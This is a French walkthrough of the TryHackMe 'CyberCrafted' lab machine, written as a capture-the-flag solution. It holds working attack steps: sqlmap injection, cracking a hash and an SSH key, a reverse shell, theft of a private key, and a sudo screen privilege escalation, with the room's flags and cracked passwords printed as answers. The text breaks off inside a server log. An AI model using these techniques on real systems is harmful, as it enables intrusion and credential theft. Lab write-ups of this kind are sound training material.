# CyberCrafted #   

## Task 1 Deploy the machine ##

**Ready.. Set...**  

On est prêt : go  

## Task 2 Root it ##

```bash
sudo sh -c "echo '10.10.185.67 CyberCrafted.thm ' >> /etc/hosts"
tim@kali:~/Bureau/tryhackme/write-up$ nmap_all cybercrafted.thm 
sudo nmap -A cybercrafted.thm -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-22 09:59 CET
Nmap scan report for cybercrafted.thm (10.10.185.67)
Host is up (0.036s latency).
rDNS record for 10.10.185.67: CyberCrafted.thm
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Cybercrafted
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/22%OT=22%CT=1%CU=31211%PV=Y%DS=2%DC=T%G=Y%TM=619B5C
OS:3D%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   34.55 ms 10.9.0.1
2   35.74 ms CyberCrafted.thm (10.10.185.67)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.82 seconds
```

D'après nmap on a trois services qui sont : 
Le service SSH sur le port 22.   
Le service HTTP sur le port 80.   
Le service minecraft sur le port 25565.   

**How many ports are open?**  

En total il y 3 ports.   

**What service runs on the highest port?**   

Le service qui fonctionne sur le pus haut port est : minecraft     

**Any subdomains? (Alphabetical order)**  

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cybercrafted.thm -H "Host: FUZZ.cybercrafted.thm" --fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1
________________________________________________

admin                   [Status: 200, Size: 937, Words: 218, Lines: 31]
www                     [Status: 200, Size: 832, Words: 236, Lines: 35]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10]
www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31]
www.store               [Status: 403, Size: 291, Words: 20, Lines: 10]
:: Progress: [4989/4989] :: Job [1/1] :: 1009 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

ffuf nous montre 3 sous domaines qui sont admin, store et www.  

**On what page did you find the vulnerability?**   

```bash
sudo sh -c "echo '10.10.185.67 admin.cybercrafted.thm ' >> /etc/hosts"
sudo sh -c "echo '10.10.185.67 store.cybercrafted.thm ' >> /etc/hosts"
sudo sh -c "echo '10.10.185.67 www.cybercrafted.thm ' >> /etc/hosts"
```

On ajoute les sous domaines.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u store.cybercrafted.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 100 -q 
/index.html           (Status: 403) [Size: 287]
/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
/search.php           (Status: 200) [Size: 838]                                            
/server-status        (Status: 403) [Size: 287]                  
```

On regardes les pages disponibles sur le site, il y a une page qui s'appelle search.php.   

![page](./Task1-01.png)   

On va sur la page search.php

![page](./Task1-02.png)   

On sauvegarde un requête avec burp.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sqlmap -r test.req http://store.cybercrafted.thm/search.php --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.5.11#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:46:44 /2021-11-22/

[10:46:44] [INFO] parsing HTTP request from 'test.req'
[10:46:44] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[10:46:44] [INFO] testing connection to the target URL
[10:46:44] [INFO] testing if the target URL content is stable
[10:46:45] [INFO] target URL content is stable
[10:46:45] [INFO] testing if POST parameter 'search' is dynamic
[10:46:45] [WARNING] POST parameter 'search' does not appear to be dynamic
[10:46:45] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[10:46:45] [INFO] testing for SQL injection on POST parameter 'search'
[10:46:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:46:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:46:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:46:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:46:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:46:46] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:46:46] [INFO] testing 'Generic inline queries'
[10:46:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:46:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:46:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:46:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:46:58] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[10:47:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:47:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:47:03] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:47:03] [INFO] target URL appears to have 4 columns in query
[10:47:03] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
```

On lance un attaque par injection sqlmap nous dit que la page est vulnerable.   

La page search.php est vulnérable.   

**What is the admin's username? (Case-sensitive)**

```bash
...
[10:49:16] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[10:49:17] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[10:49:17] [INFO] starting 4 processes 
[10:49:23] [WARNING] no clear password(s) found                                                                                                                                                                                              
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+

[10:49:23] [INFO] table 'webapp.admin' dumped to CSV file '/home/tim/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/admin.csv'
[10:49:23] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 29 times
[10:49:23] [INFO] fetched data logged to text files under '/home/tim/.local/share/sqlmap/output/store.cybercrafted.thm'

[*] ending @ 10:49:23 /2021-11-22/
...
```

On récupère les tables avec sql map.  
On voit que le nom de l'administrateur est : xXUltimateCreeperXx    

**What is the web flag?** 

Dans la base de donnée extraite par sqlmap  on voit que le flag est : THM{bbe315906038c3a62d9b195001f75008} 

**Can you get the Minecraft server flag?**   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ haiti 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
SHA-1 [HC: 100] [JtR: raw-sha1]

tim@kali:~/Bureau/tryhackme/write-up$ echo '88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01' > hash 

john hash -w=/usr/share/wordlists/rockyou.txt --format=raw-sha1
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
diamond123456789 (?)     
1g 0:00:00:00 DONE (2021-11-22 10:55) 2.083g/s 17995Kp/s 17995Kc/s 17995KC/s diamond1336..diamond123123
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```

On récupère le hash.   
On identifie le hash comme du sha1.   
On casse le hash, le mot de passe est : diamond1234546789  

![page](./Task1-03.png)  
On se connecte avec les identifiants administrateur.   

![page](./Task1-04.png)   
On tombre sur une page ou on peut exécuter des commandes.  

```bash
On écoute sur le port 1234 pour avoir une connexion sur un shell.   
```

![page](./Task1-05.png)   
On exécute un reverse shell.   

```bash
sudo pwncat -l 1234
[sudo] Mot de passe de tim : 
[11:04:37] Welcome to pwncat 🐈!                                                                                                                                                                                               __main__.py:153
[11:05:18] received connection from 10.10.185.67:56798                                                                                                                                                                              bind.py:76
[11:05:19] 10.10.185.67:56798: registered new host w/ db                                                                                                                                                                        manager.py:504
(local) pwncat$                                                

(remote) www-data@cybercrafted:/var/www/admin$ ls /home
cybercrafted  xxultimatecreeperxx

(remote) www-data@cybercrafted:/var/www/admin$ ls -al /home/xxultimatecreeperxx/
total 32
drwxr-xr-x 5 xxultimatecreeperxx xxultimatecreeperxx 4096 Oct 15 20:43 .
drwxr-xr-x 4 root                root                4096 Jun 27 17:50 ..
lrwxrwxrwx 1 root                root                   9 Sep 12 10:38 .bash_history -> /dev/null
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  220 Jun 27 09:19 .bash_logout
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 3771 Jun 27 09:19 .bashrc
drwx------ 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27 09:38 .cache
drwx------ 3 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27 09:38 .gnupg
-rw-rw-r-- 1 xxultimatecreeperxx xxultimatecreeperxx    0 Jun 27 17:40 .hushlogin
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  807 Jun 27 09:19 .profile
drwxrwxr-x 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27 09:35 .ssh
lrwxrwxrwx 1 root                root                   9 Oct 15 20:43 .viminfo -> /dev/null

(remote) www-data@cybercrafted:/var/www/admin$ cat /home/xxultimatecreeperxx/.ssh/id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----
```

On a un shell.   
Dans le répertoire /home/xxultimatecreeperxx/.ssh on trouve la clé privée SSH de xxultimatecreeperxx.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----

tim@kali:~/Bureau/tryhackme/write-up$ /usr/share/john/ssh2john.py id_rsa > hash

tim@kali:~/Bureau/tryhackme/write-up$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
creepin2006      (id_rsa)     
1g 0:00:00:00 DONE (2021-11-22 11:20) 2.777g/s 5266Kp/s 5266Kc/s 5266KC/s creepygoblin..creek93
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 id_rsa 

```

On réupère la clef.   
On casse le mot de passe avec john the ripper.   
Le mot de passe est : creepin2006.   
On met les bons droits sur le fichier id_rsa.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i id_rsa xxultimatecreeperxx@admin.cybercrafted.thm
Enter passphrase for key 'id_rsa': 

xxultimatecreeperxx@cybercrafted:/$ find / -name 'minecraft' 2> /dev/null 
/opt/minecraft

xxultimatecreeperxx@cybercrafted:/$ ls /opt/minecraft/
cybercrafted  minecraft_server_flag.txt  note.txt  WorldBackup

xxultimatecreeperxx@cybercrafted:/$ cat /opt/minecraft/minecraft_server_flag.txt 
THM{ba93767ae3db9f5b8399680040a0c99e}
```

On se connete sur le compte de xxultimatecreeperxx.   
On cherchant minecraft on trouve un répertoire avec le même nom dans opt.  
Dans minicraft il y a un fichier minecraft_server_flag.txt qui contient le flag.   
Le flag est : THM{ba93767ae3db9f5b8399680040a0c99e}   

**What is the name of the sketchy plugin?**

```bash
xxultimatecreeperxx@cybercrafted:/$ cat /opt/minecraft/note.txt 
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.

xxultimatecreeperxx@cybercrafted:/$ ls /opt/minecraft/cybercrafted/plugins/
LoginSystem  LoginSystem_v.2.4.jar
```

On trouve un note qui dit qu'il y a un plugin implémanté.  
On trouve le plugin dans /opt/minecraft/cybercrafted/plugins/.  
Le nom du plugin est : LoginSystem   

**What is the user's flag?**

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
language.yml  log.txt  passwords.yml  settings.yml
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt 

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123


[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!
[2021/11/22 08:55:38] [BUKKIT-SERVER] Startet LoginSystem!xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ 

xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat  passwords.yml 
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
```

Dans /opt/minecraft/cybercrafted/plugins/LoginSystem on trouve un fichier log.txt et passwords.yml.  
Dans log.txt on trouve le mot de passe et dans passwords.yml le nom d'utilisateur.  

```bash
xxultimatecreeperxx@cybercrafted:~$ su cybercrafted
Password: 
cybercrafted@cybercrafted:/home/xxultimatecreeperxx$ id
uid=1002(cybercrafted) gid=1002(cybercrafted) groups=1002(cybercrafted)

cybercrafted@cybercrafted:/home/xxultimatecreeperxx$ cat /home/cybercrafted/user.txt 
THM{b4aa20aaf08f174473ab0325b24a45ca}
```

Avec le nom d'utilisateur et le mot de passe on se connecte.   
Dans /home/cybercrafted on trouver un fichier user.txt qui contient le flag. 
Le flag est : THM{b4aa20aaf08f174473ab0325b24a45ca}   

**Finish the job and give me the root flag!**

```bash
cybercrafted@cybercrafted:/home/xxultimatecreeperxx$ sudo -l
[sudo] password for cybercrafted: 
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```

On peut exécuter screen avec les droits root.   

```bash
cybercrafted@cybercrafted:/home/xxultimatecreeperxx$ sudo /usr/bin/screen -r cybercrafted
Loading libraries, please wait...
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by net.minecraft.util.io.netty.util.internal.PlatformDependent0 (file:/opt/minecraft/cybercrafted/craftbukkit-1.7.2-server.jar) to field java.nio.DirectByteBuffer.cleaner
WARNING: Please consider reporting this to the maintainers of net.minecraft.util.io.netty.util.internal.PlatformDependent0
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
Nov 22, 2021 1:00:23 PM net.minecraft.util.io.netty.util.internal.PlatformDependent <clinit>
INFO: Your platform does not provide complete low-level API for accessing direct buffers reliably. Unless explicitly requested, heap buffer will always be preferred to avoid potential system unstability.
[13:00:24 INFO]: Starting minecraft server version 1.7.2
[13:00:24 WARN]: To start the server with more ram, launch it as "java -Xmx1024M -Xms1024M -jar minecraft_server.jar"
[13:00:24 INFO]: Loading properties
[13:00:24 INFO]: Default game type: SURVIVAL
[13:00:24 INFO]: Generating keypair
[13:00:24 INFO]: Starting Minecraft server on *:25565
[13:00:24 INFO]: This server is running CraftBukkit version git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks (MC: 1.7.2) (Implementing API version 1.7.2-R0.4-SNAPSHOT)
[13:00:24 INFO]: [LoginSystem] Loading LoginSystem v28.06.14
[13:00:24 WARN]: **** SERVER IS RUNNING IN OFFLINE/INSECURE MODE!
[13:00:24 WARN]: The server will make no attempt to authenticate usernames. Beware.
[13:00:24 WARN]: While this makes the game possible to play without internet access, it also opens up the ability for hackers to connect with any username they choose.
[13:00:24 WARN]: To change this, set "online-mode" to "true" in the server.properties file.
[13:00:24 INFO]: Preparing level "world"
[13:00:24 INFO]: Preparing start region for level 0 (Seed: -5206262128015530429)
[13:00:25 INFO]: Preparing start region for level 1 (Seed: -6996514463042131388)
[13:00:25 INFO]: [LoginSystem] Enabling LoginSystem v28.06.14
[13:00:25 ERROR]: Error occurred while enabling LoginSystem v28.06.14 (Is it up to date?)
java.lang.NoClassDefFoundError: org/spigotmc/Metrics
        at de.fkfabian.main.onEnable(main.java:57) ~[?:?]
        at org.bukkit.plugin.java.JavaPlugin.setEnabled(JavaPlugin.java:250) ~[craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at org.bukkit.plugin.java.JavaPluginLoader.enablePlugin(JavaPluginLoader.java:324) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at org.bukkit.plugin.SimplePluginManager.enablePlugin(SimplePluginManager.java:404) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at org.bukkit.craftbukkit.v1_7_R1.CraftServer.loadPlugin(CraftServer.java:439) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at org.bukkit.craftbukkit.v1_7_R1.CraftServer.enablePlugins(CraftServer.java:375) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.MinecraftServer.m(MinecraftServer.java:342) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.MinecraftServer.g(MinecraftServer.java:319) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.MinecraftServer.a(MinecraftServer.java:275) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.DedicatedServer.init(DedicatedServer.java:175) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.MinecraftServer.run(MinecraftServer.java:424) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.ThreadServerApplication.run(SourceFile:617) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
Caused by: java.lang.ClassNotFoundException: org.spigotmc.Metrics
        at java.base/java.net.URLClassLoader.findClass(URLClassLoader.java:471) ~[?:?]
        at org.bukkit.plugin.java.PluginClassLoader.findClass(PluginClassLoader.java:77) ~[craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
